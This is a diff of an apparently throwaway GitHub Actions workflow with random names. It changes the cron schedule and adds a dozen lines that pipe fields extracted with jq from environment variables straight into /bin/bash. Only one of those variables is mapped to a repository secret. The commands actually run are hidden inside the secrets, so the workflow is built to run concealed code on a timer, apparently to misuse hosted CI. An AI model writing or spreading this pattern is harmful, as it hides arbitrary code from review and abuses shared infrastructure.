@@ -2,7 +2,7 @@ name: gaochanghui5647
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 2/6 * * *'
+    - cron: '24 5/6 * * *'
 
 jobs:
   build:
@@ -11,10 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: gaochanghui5647
         env:
-          jem4: ${{ secrets.jem4 }}
+          xwntm3432: ${{ secrets.xwntm3432 }}
         run: |
-          echo $jem4 | jq -r .g3059 | /bin/bash
-          echo $syvhc394 | jq -r .phtnq080 | /bin/bash
-          echo $plega36138 | jq -r .tjd7 | /bin/bash
-          echo $ulr8493 | jq -r .szus713 | /bin/bash
+          echo $xwntm3432 | jq -r .b96 | /bin/bash
+          echo $jqpph1016 | jq -r .s0798 | /bin/bash
+          echo $ju36 | jq -r .sn38846 | /bin/bash
+          echo $vp90 | jq -r .ouawz48313 | /bin/bash
+          echo $pmi6468 | jq -r .l2176 | /bin/bash
+          echo $jgzud91 | jq -r .eff3 | /bin/bash
+          echo $wi10416 | jq -r .sl03 | /bin/bash
+          echo $kzfmm849 | jq -r .eeh08 | /bin/bash
+          echo $fz7246 | jq -r .n689 | /bin/bash
+          echo $agqn6721 | jq -r .q9583 | /bin/bash
+          echo $i85348 | jq -r .pql54310 | /bin/bash
+          echo $whiq49 | jq -r .uv60792 | /bin/bash
 
